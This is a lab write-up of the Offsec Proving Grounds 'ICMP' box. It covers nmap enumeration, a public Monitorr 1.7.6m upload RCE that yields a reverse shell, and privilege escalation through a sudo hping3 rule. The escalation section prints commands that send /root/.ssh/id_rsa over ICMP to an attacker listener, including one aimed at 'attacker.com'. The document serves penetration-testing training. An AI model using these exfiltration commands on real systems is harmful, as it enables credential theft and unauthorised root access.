---
layout: writeup
category: Offsec-PG
section: Labs
chall_description: 
points: 
solves: 
tags: 
date: 2026-03-19
comments: false
---

## ## Challenge Description

A medium box with the Monitorr RCE vulnerability and hping3 SUID upload exploit. 

## ## Enumeration

As usual I started with nmap for port scanning using following command:

```
nmap -sC -sV -A -p- [ Box IP ]
# Nmap 7.95 scan initiated Wed Sep 16 01:33:42 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC --reason -oA icmpbox.out 192.168.150.218
Nmap scan report for 192.168.150.218
Host is up, received reset ttl 61 (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA)
|   256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA)
|_  256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-title:             Monitorr            | Monitorr        
|_Requested resource was http://192.168.150.218/mon/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 16 01:34:12 2026 -- 1 IP address (1 host up) scanned in 30.35 seconds
```

An HTTP service was identified on port 80, prompting targeted web enumeration to identify possible attack vectors. 

Visiting http://BoxIP brings us to /mon/ that runs Monitorr 1.7.6m

![](../..//\assets\CTFs\Offsec-PG/ICMP/monitorr.PNG)

## **Exploit Identification** on Monitorr 1.7.6m

By using Searchploit or looking for Monitorr 1.7.6m on vuln db, I found  this version is vulnerable to unauthenticated RCE. I then review the [exploit on exploit-db](https://www.exploit-db.com/exploits/48980) and executed it with the parametres. This exploit takes advantage of the upload function to upload a reverse shell and execute it on the victim, so I set up a listenner on my machine:


![](../..//\assets\CTFs\Offsec-PG/ICMP/localflag.PNG)

With this initial foothold, I navigated through the system as www-data and found user `fox`, with some valuable informations in /home/fox as well as the `local.txt` flag.

The devel directory is inaccessible as www-data due to insufficient permission, but I can read reminder talking about a file called crypt.php that they used for encrypting stuff. So by guessing the path /home/fox/devel/crypt.php, I can read its content:

![](../..//\assets\CTFs\Offsec-PG/ICMP/fox.PNG)

By using the password in crypt.php, I logged in as `fox` successfully.

## Privilege Escalation

As `fox` , I used sudo -l to identify any commands that could be executed with elevated rights:  

```
(root) /usr/sbin/hping3 --icmp *
(root) /usr/bin/killall hping3 
```

According to GTFOBins, we can either spawn a SUID shell, or upload file via icmp. However the --icmp in sudo config forced us to follow the second option.

```
Victim:
hping3 attacker.com --icmp --data 999 --sign thng01signature --file /path/to/input-file

Receiver:
hping3 --icmp --listen thng01signature --dump

```

Previously, Linpeas revealed the ssh config of `root` as followed:

![](../..//\assets\CTFs\Offsec-PG/ICMP/rootsshsetting.PNG)

So the idea of PE is like this: 
On attacker machine, setup a listenner:

```
sudo hping3 --icmp --listen thng01signature --dump 
#I had trouble finding the packet so I had to add -I tun0 to tell hping3 which interface to listen on
```

On Victim, try to send id_rsa key file to attacker:

```
sudo -u root /usr/sbin/hping3 --icmp --data 9999 --sign thng01signature --file /root/.ssh/id_rsa
```

Once we get the ssh private key file of `root` we can login as root and get the flag.

Executing:

![](../..//\assets\CTFs\Offsec-PG/ICMP/hping3.PNG)

The --data option tells hping3 the size of chunks to send via icmp. By default I set 999, but the data received on attacker keeps echoing (you can see below where the icmp packet request and reply are shown on terminal, resulting duplication), and 999 is not enough to cover the size of the key file. 

![](../..//\assets\CTFs\Offsec-PG/ICMP/sshkey.PNG)

So I try with --data 9999 and it worked like a charm. The last step is to set permission of id_rsa file to 0600, and login with it:

```
ssh root@IP_Box -i ./id_rsa
```

![](../..//\assets\CTFs\Offsec-PG/ICMP/proof.PNG)

And we get the proof.txt.
